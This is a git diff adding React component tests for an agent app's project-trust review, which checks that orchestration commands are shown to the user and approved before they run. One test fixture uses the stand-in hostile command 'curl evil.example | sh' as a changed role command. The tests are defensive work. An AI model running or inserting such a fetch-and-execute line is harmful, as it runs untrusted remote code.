@@ -1,8 +1,11 @@
 import { act, cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
-import { describe, expect, it, vi } from "vitest";
+import { afterEach, describe, expect, it, vi } from "vitest";
+import { approvedProjectTrust } from "../test/projectTrust";
 import { createFixtureSnapshot, createFixtureStartedAgent } from "../data/fixture";
-import type { AgentSession, ConnectionView, DeckDirectoryListing, DeckListingOptions, DeckSnapshot, NewAgentOptions, NewAgentOrchestrations } from "../types";
+import type { AgentSession, ConnectionView, DeckAction, DeckActionResult, DeckDirectoryListing, DeckListingOptions, DeckSnapshot, NewAgentOptions, NewAgentOrchestrations } from "../types";
 import { LaunchCleanupError } from "../lib/actionError";
+import { APPROVE_AND_START, approveShownReview, shownReviewToken, CHANGED_SINCE_APPROVAL, NO_REVIEW_OPEN, NOT_APPROVED_BEFORE, REVIEW_FIRST, TRUST_TEXT_CHANGED_NOTICE, TRUST_TITLE, type ProjectTrust, type ProjectTrustTarget } from "../lib/projectTrust";
+import { VOICE_ACTIONS, type NewAgentVoiceChannel } from "../lib/voiceActions";
 import type { NewAgentDraft } from "../lib/newAgentDraft";
 import { NewAgentDialog, DECK_SEARCH_DEBOUNCE_MS, SEARCH_TRUNCATED, TRUNCATED_NO_SEARCH, TRUNCATED_SEARCHABLE, DRAFT_DIRECTORY_GONE, DRAFT_MODE_GONE, DRAFT_RESTORED, draftDeckGone, draftOtherDeck, type NewAgentRuntime } from "./NewAgentDialog";
 
@@ -54,6 +57,7 @@ function fakeRuntime(overrides: Partial<NewAgentRuntime> = {}) {
     fleet: [deck(LOCAL, { deckKind: "local" }), deck(REMOTE, { status: "disconnected" })],
     runAction: vi.fn(async () => ({ ok: true, agentId: "7" })),
     clearError: vi.fn(),
+    ...approvedProjectTrust(),
     listDirectories: vi.fn(async (_deckId: string, path?: string): Promise<DeckDirectoryListing> => {
       const listing = TREE[path ?? ""];
       if (!listing) throw new Error("daemon returned error: unresolved: that path did not resolve to a readable directory on this daemon");
@@ -2237,5 +2241,399 @@ describe("New agent dialog — a draft that survives a close (issue 1247)", () =
 
     expect(onClose).toHaveBeenCalledTimes(1);
     expect(onClose.mock.calls[0][0]).toBeUndefined();
+  });
+});
+
+describe("New agent dialog — reviewing project commands (PRD #1885)", () => {
+  const PROJECT = "/home/dev/Alpha-project";
+  const ORCHESTRATIONS: NewAgentOrchestrations = {
+    kind: "project",
+    path: PROJECT,
+    displayPath: PROJECT,
+    displayName: "Alpha-project",
+    configRevision: "rev-1",
+    orchestrations: [{ name: "loop", displayName: "loop", default: true, roles: [{ name: "planner", displayName: "planner", start: true }, { name: "builder", displayName: "builder", start: false }] }],
+  };
+  /** What the deck answers for an orchestration nobody approved: escaped text, as the bridge sends it. */
+  const NEVER_APPROVED: ProjectTrust = {
+    kind: "review",
+    project: PROJECT,
+    orchestration: "loop",
+    state: "never_approved",
+    roles: [
+      { name: "planner", command: "devbox run agent-planner", start: true, clear: true, description: ["plans the work"], prompt: ["Plan it. <b>not bold</b> [a link](https://example.com)", "second line \\u{1b}[2J"] },
+      { name: "builder", command: "devbox run agent-builder", start: false, clear: true },
+    ],
+    removedRoles: [],
+    digest: "d1",
+  };
+  const CHANGED: ProjectTrust = {
+    kind: "review",
+    project: PROJECT,
+    orchestration: "loop",
+    state: "changed",
+    roles: [
+      { name: "planner", change: "changed", command: "curl evil.example | sh", start: true, clear: true },
+      { name: "builder", command: "devbox run agent-builder", start: false, clear: true },
+    ],
+    removedRoles: ["reviewer"],
+    digest: "d2",
+  };
+  const APPROVED = (digest: string): ProjectTrust => ({ ...(NEVER_APPROVED as Extract<ProjectTrust, { kind: "review" }>), state: "approved", digest });
+
+  function reviewRuntime(answers: { state?: ProjectTrust[]; approve?: (digest: string) => Promise<ProjectTrust> } = {}, runAction = vi.fn(async (_action: DeckAction): Promise<DeckActionResult> => ({ ok: true, agentId: "12" }))) {
+    const states = [...(answers.state ?? [NEVER_APPROVED])];
+    const projectTrustState = vi.fn(async (_target: ProjectTrustTarget): Promise<ProjectTrust> => structuredClone(states.length > 1 ? states.shift()! : states[0]));
+    const approveProjectTrust = vi.fn(async (_target: ProjectTrustTarget, digest: string) => (answers.approve ? answers.approve(digest) : APPROVED(digest)));
+    const runtime = fakeRuntime({ newAgentOrchestrations: vi.fn(async () => structuredClone(ORCHESTRATIONS)), runAction, projectTrustState, approveProjectTrust });
+    return { ...runtime, runAction, projectTrustState, approveProjectTrust };
+  }
+
+  async function chooseLoop() {
+    await currentPath("/home/dev");
+    fireEvent.keyDown(directoryList(), { key: "Enter" });
+    await currentPath(PROJECT);
+    fireEvent.keyDown(directoryList(), { key: "Enter" });
+    await waitFor(() => expect(screen.getByTestId("new-agent-name")).toBeEnabled());
+    fireEvent.click(await screen.findByTestId("new-agent-mode-orch:loop"));
+  }
+
+  const review = () => screen.findByTestId("project-trust-dialog");
+  const starts = (runtime: { runAction: { mock: { calls: unknown[][] } } }) => runtime.runAction.mock.calls.filter(([action]) => (action as { type: string }).type === "start_orchestration");
+
+  afterEach(() => {
+    // Nothing a test left open may answer the next test's voice.
+    expect(approveShownReview(shownReviewToken())).toBe(NO_REVIEW_OPEN);
+  });
+
+  /**
+   * Scenario: the user activates an orchestration nobody approved. The deck
+   * is asked first, and the review shows the TUI's title, the project, the
+   * orchestration, "not approved before" and every role's command,
+   * description and prompt — the prompt's markup and escapes as plain text —
+   * while nothing has started.
+   */
+  it("shows the review for a never-approved orchestration and starts nothing", async () => {
+    const runtime = reviewRuntime();
+    renderDialog(runtime);
+    await chooseLoop();
+
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+
+    const dialog = await review();
+    expect(runtime.projectTrustState).toHaveBeenCalledWith({ deckId: LOCAL, path: PROJECT, orchestration: "loop" });
+    expect(within(dialog).getByRole("heading")).toHaveTextContent(TRUST_TITLE);
+    expect(within(dialog).getByTestId("project-trust-project")).toHaveTextContent(PROJECT);
+    expect(within(dialog).getByTestId("project-trust-orchestration")).toHaveTextContent("loop");
+    expect(within(dialog).getByTestId("project-trust-state")).toHaveTextContent(NOT_APPROVED_BEFORE);
+    expect(within(dialog).getAllByTestId("project-trust-command").map((node) => node.textContent)).toEqual(["devbox run agent-planner", "devbox run agent-builder"]);
+    const prompt = within(dialog).getByTestId("project-trust-prompt");
+    expect(prompt.textContent).toBe("Plan it. <b>not bold</b> [a link](https://example.com)\nsecond line \\u{1b}[2J");
+    expect(prompt.querySelector("b")).toBeNull();
+    expect(prompt.querySelector("a")).toBeNull();
+    expect(within(dialog).getByRole("button", { name: APPROVE_AND_START })).not.toHaveFocus();
+    expect(starts(runtime)).toHaveLength(0);
+    expect(runtime.approveProjectTrust).not.toHaveBeenCalled();
+
+    fireEvent.click(within(dialog).getByRole("button", { name: "Cancel" }));
+  });
+
+  /** Scenario: Cancel closes the review, leaves the form as it was, and neither approves nor starts anything. */
+  it("cancels without approving or starting", async () => {
+    const runtime = reviewRuntime();
+    const { onClose } = renderDialog(runtime);
+    await chooseLoop();
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    const dialog = await review();
+
+    fireEvent.click(within(dialog).getByRole("button", { name: "Cancel" }));
+
+    await waitFor(() => expect(screen.queryByTestId("project-trust-dialog")).toBeNull());
+    expect(runtime.approveProjectTrust).not.toHaveBeenCalled();
+    expect(starts(runtime)).toHaveLength(0);
+    expect(onClose).not.toHaveBeenCalled();
+    expect(screen.getByTestId("new-agent-start")).toBeEnabled();
+  });
+
+  /** Scenario: Esc in the review cancels it, and the New agent dialog under it stays open. */
+  it("cancels on Escape and keeps the New agent dialog", async () => {
+    const runtime = reviewRuntime();
+    const { onClose } = renderDialog(runtime);
+    await chooseLoop();
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    const dialog = await review();
+
+    fireEvent.keyDown(dialog, { key: "Escape" });
+
+    await waitFor(() => expect(screen.queryByTestId("project-trust-dialog")).toBeNull());
+    expect(onClose).not.toHaveBeenCalled();
+    expect(runtime.approveProjectTrust).not.toHaveBeenCalled();
+    expect(starts(runtime)).toHaveLength(0);
+  });
+
+  /** Scenario: Enter — on the card or on the Approve and start button itself — never approves. */
+  it("does not approve on Enter", async () => {
+    const runtime = reviewRuntime();
+    renderDialog(runtime);
+    await chooseLoop();
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    const dialog = await review();
+
+    fireEvent.keyDown(dialog, { key: "Enter" });
+    fireEvent.keyDown(within(dialog).getByRole("button", { name: APPROVE_AND_START }), { key: "Enter" });
+    fireEvent.keyDown(within(dialog).getByTestId("project-trust-body"), { key: "Enter" });
+
+    expect(runtime.approveProjectTrust).not.toHaveBeenCalled();
+    expect(starts(runtime)).toHaveLength(0);
+    expect(screen.getByTestId("project-trust-dialog")).toBeInTheDocument();
+    fireEvent.click(within(dialog).getByRole("button", { name: "Cancel" }));
+  });
+
+  /**
+   * Scenario: Approve and start sends the digest of the text that was shown,
+   * and only once the deck recorded it does the orchestration start, exactly
+   * as an approved one does.
+   */
+  it("approves the shown digest, then starts", async () => {
+    const runtime = reviewRuntime();
+    renderDialog(runtime);
+    await chooseLoop();
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    const dialog = await review();
+
+    fireEvent.click(within(dialog).getByRole("button", { name: APPROVE_AND_START }));
+
+    await waitFor(() => expect(starts(runtime)).toHaveLength(1));
+    expect(runtime.approveProjectTrust).toHaveBeenCalledWith({ deckId: LOCAL, path: PROJECT, orchestration: "loop" }, "d1");
+    expect(runtime.approveProjectTrust.mock.invocationCallOrder[0]).toBeLessThan(runtime.runAction.mock.invocationCallOrder[0]);
+    expect(starts(runtime)[0][0]).toMatchObject({ type: "start_orchestration", deckId: LOCAL, path: PROJECT, orchestration: "loop" });
+    expect(screen.queryByTestId("project-trust-dialog")).toBeNull();
+    expect(await screen.findByTestId("new-agent-waiting")).toBeVisible();
+  });
+
+  /** Scenario: an approved, unchanged orchestration starts at once, with no review. */
+  it("starts an approved orchestration with no review", async () => {
+    const runtime = reviewRuntime({ state: [APPROVED("d0")] });
+    renderDialog(runtime);
+    await chooseLoop();
+
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+
+    await waitFor(() => expect(starts(runtime)).toHaveLength(1));
+    expect(screen.queryByTestId("project-trust-dialog")).toBeNull();
+    expect(runtime.approveProjectTrust).not.toHaveBeenCalled();
+  });
+
+  /**
+   * Scenario: an orchestration changed since its approval. The review says
+   * "changed since you approved it", marks the changed role, and lists the
+   * role the approval had that is gone.
+   */
+  it("marks a changed role and a removed one", async () => {
+    const runtime = reviewRuntime({ state: [CHANGED] });
+    renderDialog(runtime);
+    await chooseLoop();
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    const dialog = await review();
+
+    expect(within(dialog).getByTestId("project-trust-state")).toHaveTextContent(CHANGED_SINCE_APPROVAL);
+    const roles = within(dialog).getAllByTestId("project-trust-role");
+    expect(within(roles[0]).getByTestId("project-trust-role-change")).toHaveTextContent("changed");
+    expect(within(roles[1]).queryByTestId("project-trust-role-change")).toBeNull();
+    expect(within(dialog).getByTestId("project-trust-removed")).toHaveTextContent("reviewer");
+    fireEvent.click(within(dialog).getByRole("button", { name: "Cancel" }));
+  });
+
+  /**
+   * Scenario: the config changed while the review was on screen. The deck
+   * refuses the approval with `trust-text-changed`; the review shows the new
+   * text and says why, nothing starts, and approving again carries the NEW
+   * digest.
+   */
+  it("re-shows the new text when the config changed meanwhile", async () => {
+    let first = true;
+    const runtime = reviewRuntime({
+      state: [NEVER_APPROVED, CHANGED],
+      approve: async (digest) => {
+        if (first) {
+          first = false;
+          throw new Error("daemon returned error: trust-text-changed: the orchestration's commands or prompts changed since they were shown, so nothing was approved");
+        }
+        return APPROVED(digest);
+      },
+    });
+    renderDialog(runtime);
+    await chooseLoop();
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    const dialog = await review();
+
+    fireEvent.click(within(dialog).getByRole("button", { name: APPROVE_AND_START }));
+
+    expect(await screen.findByTestId("project-trust-notice")).toHaveTextContent(TRUST_TEXT_CHANGED_NOTICE);
+    expect(screen.getAllByTestId("project-trust-command")[0]).toHaveTextContent("curl evil.example | sh");
+    expect(starts(runtime)).toHaveLength(0);
+
+    fireEvent.click(screen.getByRole("button", { name: APPROVE_AND_START }));
+
+    await waitFor(() => expect(starts(runtime)).toHaveLength(1));
+    expect(runtime.approveProjectTrust).toHaveBeenLastCalledWith({ deckId: LOCAL, path: PROJECT, orchestration: "loop" }, "d2");
+  });
+
+  /**
+   * PRD #1885 review (reviewer 4). Scenario: the orchestrations were listed at
+   * config revision rev-1; the config changes to rev-2 while the review is on
+   * screen, so the first approval is refused with `trust-text-changed` and the
+   * review re-shows the new text. Approving that text starts the
+   * orchestration: the deck here enforces the revision as the real one does,
+   * refusing a start at any revision but the current one with
+   * `stale-revision`, and the start carries the revision of the text the user
+   * approved rather than the one listed before the change.
+   */
+  it("starts at the revision of the text approved after a re-shown review", async () => {
+    let current = "rev-1";
+    let first = true;
+    const runAction = vi.fn(async (action: DeckAction): Promise<DeckActionResult> => {
+      if (action.type === "start_orchestration" && action.configRevision !== current) {
+        throw new Error(`daemon returned error: stale-revision: the project's config changed since it was resolved (${action.configRevision ?? "none"})`);
+      }
+      return { ok: true, agentId: "12" };
+    });
+    const runtime = reviewRuntime({
+      state: [{ ...NEVER_APPROVED, configRevision: "rev-1" } as ProjectTrust, { ...CHANGED, configRevision: "rev-2" } as ProjectTrust],
+      approve: async (digest) => {
+        if (first) {
+          first = false;
+          current = "rev-2";
+          throw new Error("daemon returned error: trust-text-changed: the orchestration's commands or prompts changed since they were shown, so nothing was approved");
+        }
+        return { ...(CHANGED as Extract<ProjectTrust, { kind: "review" }>), state: "approved", digest, configRevision: current };
+      },
+    }, runAction);
+    renderDialog(runtime);
+    await chooseLoop();
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    fireEvent.click(within(await review()).getByRole("button", { name: APPROVE_AND_START }));
+    expect(await screen.findByTestId("project-trust-notice")).toHaveTextContent(TRUST_TEXT_CHANGED_NOTICE);
+
+    fireEvent.click(screen.getByRole("button", { name: APPROVE_AND_START }));
+
+    await waitFor(() => expect(starts(runtime)).toHaveLength(1));
+    expect(starts(runtime)[0][0]).toEqual(expect.objectContaining({ type: "start_orchestration", configRevision: "rev-2" }));
+    await waitFor(() => expect(screen.queryByText(/stale-revision/)).toBeNull());
+    expect(runtime.approveProjectTrust).toHaveBeenLastCalledWith({ deckId: LOCAL, path: PROJECT, orchestration: "loop" }, "d2");
+  });
+
+  /**
+   * Scenario: a deck older than the review. Nothing starts, and the form
+   * says why in the deck bridge's words, which name the approving command.
+   */
+  it("refuses against an older deck, naming the approving command", async () => {
+    const reason = "This deck's daemon is older than this app and cannot show the review of the orchestration's commands and prompts, so nothing was started. Upgrade that deck's daemon, or on its host review and approve them with `dot-agent-deck trust approve /home/dev/Alpha-project --orchestration loop` and start the orchestration from the TUI there.";
+    const runtime = reviewRuntime({ state: [{ kind: "unsupported", reason }] });
+    renderDialog(runtime);
+    await chooseLoop();
+
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+
+    expect(await screen.findByTestId("new-agent-error")).toHaveTextContent("dot-agent-deck trust approve");
+    expect(screen.queryByTestId("project-trust-dialog")).toBeNull();
+    expect(starts(runtime)).toHaveLength(0);
+  });
+
+  /** Scenario: a runtime that cannot ask the deck at all starts nothing rather than starting unreviewed. */
+  it("starts nothing when the runtime cannot review", async () => {
+    const runtime = reviewRuntime();
+    const { projectTrustState: _state, approveProjectTrust: _approve, ...withoutReview } = runtime;
+    renderDialog(withoutReview as typeof runtime);
+    await chooseLoop();
+
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+
+    expect(await screen.findByTestId("new-agent-error")).toHaveTextContent("Nothing was started");
+    expect(starts(runtime)).toHaveLength(0);
+  });
+
+  /**
+   * Scenario: the deck answered "approved", but the config changed before the
+   * start, so the start is refused with `not-approved`. The review comes up
+   * with the text the deck has now, instead of an error.
+   */
+  it("reviews again when the start is refused as not approved", async () => {
+    let call = 0;
+    const runtime = reviewRuntime({ state: [APPROVED("d0"), CHANGED] }, vi.fn(async (_action: DeckAction): Promise<DeckActionResult> => {
+      call += 1;
+      if (call === 1) throw new Error("daemon returned error: not-approved: orchestration loop of project /home/dev/Alpha-project changed since you approved it");
+      return { ok: true, agentId: "12" };
+    }));
+    renderDialog(runtime);
+    await chooseLoop();
+
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+
+    const dialog = await review();
+    expect(within(dialog).getByTestId("project-trust-state")).toHaveTextContent(CHANGED_SINCE_APPROVAL);
+    expect(screen.queryByTestId("new-agent-error")).toBeNull();
+
+    fireEvent.click(within(dialog).getByRole("button", { name: APPROVE_AND_START }));
+    await waitFor(() => expect(runtime.runAction).toHaveBeenCalledTimes(2));
+    expect(runtime.approveProjectTrust).toHaveBeenCalledWith({ deckId: LOCAL, path: PROJECT, orchestration: "loop" }, "d2");
+  });
+
+  /**
+   * Scenario: voice. With the review open, the shell's approve member
+   * (`approve_project_commands`, through `VOICE_ACTIONS.approveProjectCommands`)
+   * approves the shown digest and starts; voice's `close` ("cancel") reaches
+   * the dialog's close, which cancels the review and keeps the form.
+   */
+  it("is approved by voice, and cancelled by voice's close", async () => {
+    const runtime = reviewRuntime();
+    const closeRequest: { current: (() => string | undefined) | undefined } = { current: undefined };
+    const onClose = vi.fn();
+    render(<NewAgentDialog runtime={runtime} onClose={onClose} onAppeared={vi.fn()} onNotAppeared={vi.fn()} closeRequest={closeRequest} />);
+    await chooseLoop();
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    await review();
+
+    act(() => { expect(closeRequest.current?.()).toBeUndefined(); });
+    await waitFor(() => expect(screen.queryByTestId("project-trust-dialog")).toBeNull());
+    expect(onClose).not.toHaveBeenCalled();
+
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    await review();
+    const reportRefused = vi.fn();
+    act(() => { VOICE_ACTIONS.approveProjectCommands.run({ approveProjectCommands: () => approveShownReview(shownReviewToken()), reportRefused }); });
+
+    await waitFor(() => expect(starts(runtime)).toHaveLength(1));
+    expect(reportRefused).not.toHaveBeenCalled();
+    expect(runtime.approveProjectTrust).toHaveBeenCalledWith({ deckId: LOCAL, path: PROJECT, orchestration: "loop" }, "d1");
+  });
+
+  /** Scenario: a spoken "start it" while the review is open starts nothing and says to review first. */
+  it("refuses a spoken start while the review is open", async () => {
+    const runtime = reviewRuntime();
+    const voice: NewAgentVoiceChannel = { current: undefined };
+    render(<NewAgentDialog runtime={runtime} onClose={vi.fn()} onAppeared={vi.fn()} onNotAppeared={vi.fn()} voice={voice} />);
+    await chooseLoop();
+    fireEvent.click(screen.getByTestId("new-agent-start"));
+    const dialog = await review();
+
+    let answer: string | undefined;
+    act(() => { answer = voice.current?.startNewAgent({ deckId: "", agentId: "", from: "overview" }); });
+
+    expect(answer).toBe(REVIEW_FIRST);
+    expect(starts(runtime)).toHaveLength(0);
+    expect(runtime.approveProjectTrust).not.toHaveBeenCalled();
+    fireEvent.click(within(dialog).getByRole("button", { name: "Cancel" }));
+  });
+});
+
+describe("approve_project_commands — the voice row (PRD #1885)", () => {
+  /** Scenario: the registry entry the row names is voice-reachable, and with no review open it approves nothing and says so. */
+  it("is a voice action that refuses with no review open", () => {
+    expect(VOICE_ACTIONS.approveProjectCommands.voice).toBe(true);
+    expect(VOICE_ACTIONS.cancelProjectCommands.no_voice).toMatch(/close/);
+    const reportRefused = vi.fn();
+    VOICE_ACTIONS.approveProjectCommands.run({ approveProjectCommands: () => approveShownReview(shownReviewToken()), reportRefused });
+    expect(reportRefused).toHaveBeenCalledWith(NO_REVIEW_OPEN);
   });
 });
